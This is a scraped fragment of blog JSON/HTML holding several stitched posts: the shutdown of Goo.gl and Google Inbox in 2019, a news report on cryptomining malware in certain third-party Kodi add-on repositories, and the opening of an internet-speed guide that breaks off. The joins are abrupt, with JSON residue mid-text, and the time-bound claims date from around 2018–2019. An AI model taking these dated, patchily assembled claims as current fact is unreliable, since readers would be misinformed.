href=\"https:\/\/firebase.google.com\/docs\/dynamic-links\/create-links\">FDL APIs<\/a>. FDL short links will automatically detect the user&#8217;s platform and send the user to either the web or your app, as appropriate.<\/em><\/p>\n<p>From 30th March 2019, Goo.gl will no longer allow to create new URL. The existing URLs will be continued to be redirected to it&#8217;s destination. Google URL Shortener closing soon. You can move to another URL shortener in mean time.<\/p>\n<p>Also Read &#8211; <a href=\"https:\/\/theshadowpress.com\/google-inbox-soon-closing-down\/\">Google Inbox Soon Closing Down; Swtich To Gmail Before March 2019<\/a>.<\/p>\n<hr \/>\n<h6><em>Parent company of The Shadow Press.<\/em><\/h6>\n<p><em>Are you searching for a secured, fast and affordable website hosting service in India? In it&#8217;s <a href=\"https:\/\/www.blog.google\/products\/gmail\/inbox-signing-find-your-favorite-features-new-gmail\/\">blog post<\/a>, Google announced about the closure of Google Inbox and a complete shift force to it&#8217;s users to Gmail. The Inbox by Gmail is closing soon by the month of March next year, in 2019. Google Inbox fans have less then 7 months to shift themselves and get adjusted to Gmail instead of Google Inbox.<\/p>\n<h1>Google Inbox Soon Closing Down<\/h1>\n<p>Initially, Google Inbox was found in year 2014 as an experiment by Google. It had features like bundling emails, and awesome AI features like\u00a0Smart Reply, Nudges and high-priority notifications.<\/p>\n<p>This sudden announcement isn&#8217;t a great surprise yet. Google has already added many Inbox features to Gmail. Also, the long interval or no upd8ate has already indicated about the closure of Google Inbox earlier.<\/p>\n<p>Still Google hasn&#8217;t added enough features in it&#8217;s Gmail platform. Although Google hasn&#8217;t yet added exciting features yet, there is still 7 months left for Google to make changes. It is more then enough for tech-giants like Google to make dozens of remarkable features. Still, It is great to see that Google is focusing on a single e-mail platform. It makes it more relevant for a giant to be focused on one.<\/p>\n<p>This brings in a lot of possible improvements\u00a0in the Gmail. Like we might see some AI features in the future. For now, if you face any difficulties transitioning\u00a0over to Gmail, you check out\u00a0<a href=\"https:\/\/support.google.com\/inbox\/answer\/9117840\" target=\"_blank\" rel=\"nofollow noopener\">this Google guide<\/a>\u00a0to know more.<\/p>\n<p>I am personally too excited for the upcoming features of Gmail. 4,700+ Users Affected"},"content":{"rendered":"<p>A large amount of users who were enjoying live stream on Kodi were found to be infected. Cryptovirus hits Windows and Linux Kodi users and had started mining Monero coin without their consent, reported by <a href=\"https:\/\/www.zdnet.com\/article\/windows-and-linux-kodi-users-infected-with-cryptomining-malware\/\">ZDNet<\/a>.<\/p>\n<h1><strong>CryptoVirus Hits Windows And Linux Kodi Users<\/strong><\/h1>\n<p>ESET, a famous cyber security firm reported that users who downloaded add-on(s) from\u00a0Bubbles, Gaia and XvBMC repositories were infected. A sudden increase of CPU usage was detected.<\/p>\n<p>The cryptomalware was said to have infected the PC of the users and started mining Monero coin.<\/p>\n<p>It was found that, the malware mined 62 coins which is equivalent to approximately 7,000$. Overall, 4700+ users were infected.\u00a0Most of the infected users were located in countries such as the US, the UK, Greece, Israel, and the Netherlands, countries where Kodi usage is also high.<\/p>\n<h1>What is <a href=\"https:\/\/kodi.tv\">Kodi<\/a>?<\/h1>\n<p>Kodi,\u00a0is a famous media player center owned by XBMC and is widely used by many people all over the world. Kodi is simply a hardware, and you need to\u00a0download add-ons\u00a0from the official repository or third-party repositories to start streaming the content.<\/p>\n<p>If you have downloaded any of these repository, you should uninstall them from your PC right now. You may don&#8217;t know, but your PC might still be mining the Monero coins.<\/p>\n<p>The repository who were hosting the infected add-on(s), is taken down right now due to some copyright infringement issues.<\/p>\n<p>Despite the fact that Kodi is available for many platforms such as\u00a0Raspberry Pi, MacOS, Android, iOS, etc. It was found that it only has affected, Linux &amp; Windows users at the moment.<\/p>\n<p>If you are a victim of this infection, you are requested to uninstall or disable Kodi until any further announcement by Kodi.<\/p>\n<p><a href=\"https:\/\/fossbytes.com\/cryptomalware-hits-windows-linux-kodi-users-4700-users-affected\/\">Source 1<\/a>, <a href=\"https:\/\/www.zdnet.com\/article\/windows-and-linux-kodi-users-infected-with-cryptomining-malware\/\">Source 2<\/a>.<\/p>\n<hr \/>\n<p>Thank you for reading out our article, if you like like then please subscribe to our mailing list. Imagine you have came back after a bad day, and planned to have chill at night on Netflix. You have bought the premium package for chill-out and you reach home after the day ends. You turn on your computer and browse to Netflix website for the beginning of the chill! Wait! Lag? Oh man! I feel like to bang my PC with a hammer! Damn it!\u00a0How to increase internet speed on PC.<\/p>\n<p>Well, No worries! You can speed up your Internet with the following ways. No more bad days, you can now enjoy your Netflix show without any lag. You&#8217;ll get the whole of speed your ISP has promised you. We often get half or 1\/4th of the speed that our Internet provider has promised to give us. It&#8217;s not to ISP&#8217;s fault, it&#8217;s our device which is running on default configuration or long term tweaked settings. Let&#8217;s begin with our optimization of Internet.<\/p>\n<div id=\"ez-toc-container\" class=\"ez-toc-v2_0_11 counter-hierarchy counter-decimal ez-toc-grey\">\n<div class=\"ez-toc-title-container\">\n<p class=\"ez-toc-title\">Jump To<\/p>\n<span class=\"ez-toc-title-toggle\"><a class=\"ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle\"><i class=\"ez-toc-glyphicon ez-toc-icon-toggle\"><\/i><\/a><\/span><\/div>\n<nav><ul class=\"ez-toc-list ez-toc-list-level-1\"><li class=\"ez-toc-page-1 ez-toc-heading-level-1\"><a class=\"ez-toc-link ez-toc-heading-1\" href=\"https:\/\/theshadowpress.com\/increase-internet-speed\/#How_to_Increase_Internet_Speed_on_PC\" title=\"How to Increase Internet Speed on PC\">How to Increase Internet Speed on PC<\/a><ul class=\"ez-toc-list-level-2\"><li class=\"ez-toc-heading-level-2\"><a class=\"ez-toc-link ez-toc-heading-2\" href=\"https:\/\/theshadowpress.com\/increase-internet-speed\/#1_CMD_Prompt_Method\" title=\"1.
